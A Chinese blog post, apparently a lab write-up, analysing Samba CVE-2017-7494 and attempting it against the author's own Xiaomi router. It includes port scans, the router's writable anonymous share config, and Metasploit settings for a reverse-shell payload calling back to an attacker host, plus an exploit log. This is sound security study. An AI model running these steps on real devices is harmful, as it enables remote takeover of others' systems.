@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerrank.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Samba,远程执行,CVE,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta name="keywords" content="Samba,远程执行,CVE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小米路由器与Samba漏洞CVE-2017-7494">
+<meta property="og:url" content="https://cool-y.github.io/2019/03/25/Samba-CVE/index.html">
+<meta property="og:site_name" content="混元霹雳手">
+<meta property="og:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg">
+<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png">
+<meta property="og:updated_time" content="2019-04-15T07:35:38.080Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小米路由器与Samba漏洞CVE-2017-7494">
+<meta name="twitter:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta name="twitter:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
+
+
+
+
+
+  <title>小米路由器与Samba漏洞CVE-2017-7494 | 混元霹雳手</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">混元霹雳手</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bookmarks">
+          <a href="/bookmarks/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-map"></i> <br>
+            
+            书签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cool-Y">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="混元霹雳手">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">小米路由器与Samba漏洞CVE-2017-7494</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T13:45:16+08:00">
+                2019-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT/" itemprop="url" rel="index">
+                    <span itemprop="name">IOT</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/25/Samba-CVE/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/03/25/Samba-CVE/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/03/25/Samba-CVE/" class="leancloud_visitors" data-flag-title="小米路由器与Samba漏洞CVE-2017-7494">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                <span title="字数统计">
+                  1.6k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                <span title="阅读时长">
+                  6 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="小米路由器与Samba漏洞CVE-2017-7494"><a href="#小米路由器与Samba漏洞CVE-2017-7494" class="headerlink" title="小米路由器与Samba漏洞CVE-2017-7494"></a>小米路由器与Samba漏洞CVE-2017-7494</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。<br>具体执行条件如下：</p>
+<ol>
+<li><p>服务器打开了文件/打印机共享端口445，让其能够在公网上访问</p>
+</li>
+<li><p>共享文件拥有写入权限</p>
+</li>
+<li><p>恶意攻击者需猜解Samba服务端共享目录的物理路径</p>
+</li>
+</ol>
+<h2 id="Samba介绍"><a href="#Samba介绍" class="headerlink" title="Samba介绍"></a>Samba介绍</h2><p>Samba是在Linux和Unix系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p>
+<p>SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>处于\source3\rpc_server\src_pipe.c的is_known_pipename()函数未对传进来的管道名pipename的路径分隔符/进行识别过滤，导致可以用绝对路径调用恶意的so文件，从而远程任意代码执行。<br>首先看到is_known_pipename()函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png" alt></p>
+<p>跟进到smb_probe_module()<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg" alt></p>
+<p>再跟进到do_smb_load_module()，发现调用的过程就在其中,调用了传进来的moudule_name对应的init_samba_module函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg" alt></p>
+<p>我们可以通过smb服务上传一个恶意的so文件，该文件包含一个输出函数init_samba_module，随后通过上述过程进行调用，执行任意代码。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="小米路由器"><a href="#小米路由器" class="headerlink" title="小米路由器"></a>小米路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -apnt</span><br><span class="line">tcp    0   0 192.168.31.1:445   0.0.0.0:*     LISTEN   0 572 1917/smbd</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1</span><br><span class="line">139/tcp  open     netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds</span><br></pre></td></tr></table></figure>
+<p><strong><em>端口已开启</em></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br><span class="line">        deadtime = 30</span><br><span class="line">        domain master = yes</span><br><span class="line">        encrypt passwords = true</span><br><span class="line">        enable core files = no</span><br><span class="line">        guest account = nobody</span><br><span class="line">        guest ok = yes</span><br><span class="line">        invalid users =</span><br><span class="line">        local master = yes</span><br><span class="line">        load printers = no</span><br><span class="line">        map to guest = Bad User</span><br><span class="line">        min receivefile size = 16384</span><br><span class="line">        null passwords = yes</span><br><span class="line">        obey pam restrictions = yes</span><br><span class="line">        passdb backend = smbpasswd</span><br><span class="line">        preferred master = yes</span><br><span class="line">        printable = no</span><br><span class="line">        smb encrypt = disabled</span><br><span class="line">        smb passwd file = /etc/samba/smbpasswd</span><br><span class="line">        socket options =  SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576</span><br><span class="line">        smb2 max trans = 1048576</span><br><span class="line">        smb2 max write = 1048576</span><br><span class="line">        smb2 max read = 1048576</span><br><span class="line">        write cache size = 262144</span><br><span class="line">        syslog = 2</span><br><span class="line">        syslog only = yes</span><br><span class="line">        use sendfile = yes</span><br><span class="line">        writeable = yes</span><br><span class="line">        log level = 1</span><br><span class="line">        unicode = True</span><br><span class="line">        max log size = 500</span><br><span class="line">        log file = /tmp/log/samba.log</span><br><span class="line">        server role = STANDALONE</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment     = Home Directories</span><br><span class="line">        browsable   = no</span><br><span class="line">        read only   = no</span><br><span class="line">        create mode = 0750</span><br><span class="line"></span><br><span class="line">[data]                    ***SMB_SHARE_NAME***</span><br><span class="line">        path = /tmp       ***SMB_FOLDER***</span><br><span class="line">        read only = no    ***具备可写权限***</span><br><span class="line">        guest ok = yes    ***允许匿名***</span><br><span class="line">        create mask = 0777</span><br><span class="line">        directory mask = 0777</span><br></pre></td></tr></table></figure></p>
+<p><strong><em>具有可写权限、目录为/tmp</em></strong></p>
+<h2 id="攻击：使用metasploit"><a href="#攻击：使用metasploit" class="headerlink" title="攻击：使用metasploit"></a>攻击：使用metasploit</h2><h3 id="设置攻击参数"><a href="#设置攻击参数" class="headerlink" title="设置攻击参数"></a>设置攻击参数</h3><p>靶机是小米路由器R3，它的系统为mips架构，但是这个库好像对它的支持不是很好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS          192.168.31.1     yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.216.129  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   7   Linux MIPSLE</span><br></pre></td></tr></table></figure></p>
+<h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.216.129:4444</span><br><span class="line">[*] 192.168.31.1:445 - Using location \\192.168.31.1\data\ for the path</span><br><span class="line">[*] 192.168.31.1:445 - Retrieving the remote path of the share &apos;data&apos;</span><br><span class="line">[*] 192.168.31.1:445 - Share &apos;data&apos; has server-side path &apos;/tmp</span><br><span class="line">[*] 192.168.31.1:445 - Uploaded payload to \\192.168.31.1\data\KcQiOcbk.so</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\PIPE\/tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+<p>虽然报错，但是查看共享文件夹/tmp却发现了生成了.so文件<br>知乎这篇<a href="https://zhuanlan.zhihu.com/p/27129229" target="_blank" rel="noopener">专栏</a>也有相同问题</p>
+<h2 id="分析POC，查找原因"><a href="#分析POC，查找原因" class="headerlink" title="分析POC，查找原因"></a>分析POC，查找原因</h2><p>(来自<a href="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/" target="_blank" rel="noopener">Wz’blog</a>)</p>
+<h3 id="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><a href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续" class="headerlink" title="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"></a>建立SMB连接。若需要账号密码登录，则必须登录后才能继续</h3><p>从微软上扒的SMB协议建立时序图：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png" alt></p>
+<p>对应POC:</p>
+<p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png" alt></p>
+<h3 id="利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><a href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path" class="headerlink" title="利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)"></a>利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg" alt></p>
+<p>其中find_writeable_path()函数需要跟进看一下：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg" alt></p>
+<p>再跟进看enumerate_directories()以及verify_writeable_directory函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg" alt><br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg" alt></p>
+<p>可以看到代码逻辑很清楚，首先遍历出当前路径所有的文件夹，然后尝试往里面写一个随机的txt文件用作可写测试，随后删除掉txt文件，记录下可写的文件路径。<br>至此，我们得到了一个共享名(即本例中的data)以及其当前路径下的可写目录(/tmp)</p>
+<h3 id="利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><a href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath" class="headerlink" title="利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)"></a>利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg" alt><br>至此获取到了共享名data的绝对路径。<br>值得注意的是，这里跟早期的Payload不一样，早期的payload是靠暴力猜解目录，所以跟一些分析文章有些出入。现在的Payload是根据NetShareGetInfo直接获取到准确的路径，极大地提高了攻击的成功率。</p>
+<h3 id="上传恶意so文件"><a href="#上传恶意so文件" class="headerlink" title="上传恶意so文件"></a>上传恶意so文件</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg" alt><br>其中写入的so文件是Metasploit生成的反弹shell，很简单的执行一句命令。有一点需要注意的是里面的函数名必须是samba_init_module并且是一个导出函数，这个原因上述的漏洞分析也有提及。</p>
+<h3 id="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><a href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功" class="headerlink" title="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"></a>调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg" alt><br>利用从第2步获取到的可写文件目录(Path)以及从第3步得到的共享文件绝对路径(SharePath)构造恶意管道名\PIPE\/SharePath/Path/Evil.so，然后通过SMB_COM_NT_CREATE_ANDX进行调用。<br>在复现时，调用恶意so文件总会失败，产生Error Code为：STATUS_OBJECT_NAME_NOT_FOUND的错误。尚未能明白为什么会出现这种首次失败的情况，也许要详细看看smb协议才能知道了。<br>POC代码将STATUS_OBJECT_PATH_INVALID作为我们payload被加载的标志，随后就是用NBSS协议进行了一次远程代码执行的测试，执行代码为echo随机字符串。</p>
+<h3 id="删除恶意so文件，断开smb连接"><a href="#删除恶意so文件，断开smb连接" class="headerlink" title="删除恶意so文件，断开smb连接"></a>删除恶意so文件，断开smb连接</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png" alt></p>
